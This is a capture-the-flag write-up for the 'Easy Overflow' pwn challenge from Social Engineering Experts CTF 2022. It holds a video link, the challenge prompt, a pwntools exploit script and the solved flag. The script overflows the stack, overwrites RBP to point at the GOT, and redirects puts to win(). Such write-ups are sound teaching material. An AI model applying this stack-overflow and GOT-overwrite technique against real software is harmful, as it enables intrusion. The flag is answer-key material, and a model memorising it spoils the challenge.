---
name: Easy Overflow (2022)
event: Social Engineering Experts CTF 2022
category: Pwn
description: Writeup for Easy Overflow (Pwn) - Social Engineering Experts CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Easy Overflow

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/-cc4U1H53F8/0.jpg)](https://youtu.be/-cc4U1H53F8?t=2362 "Social Engineering Experts CTF 2022: Easy Overflow")

## Description

> I did a check on my return address. Now you shouldn't be able to control my RIP.

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x4011ca
break *0x401247
continue
'''.format(**locals())

# Binary filename
exe = './easy_overflow'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Build the payload
payload = flat([
    b'A' * 32,  # Pad to stack
    # Overwrite RBP with address of got.gets()
    elf.got.gets,  # This will become got.puts
    0x401212  # Address required to meet RIP check
])

# Send the payload
io.sendlineafter(b'I will let you  overflow me.', payload)

# Write the address of win() into puts()
io.sendlineafter(b'I will give you one more chance.', flat(elf.functions.win))

# Got Flag?
io.interactive()
```
{% endcode %}

Flag: `SEE{R1P_15_K1NG_RBP_15_QU33N_31cfc2f963517cd7e1b33b84a0e6bea2}`
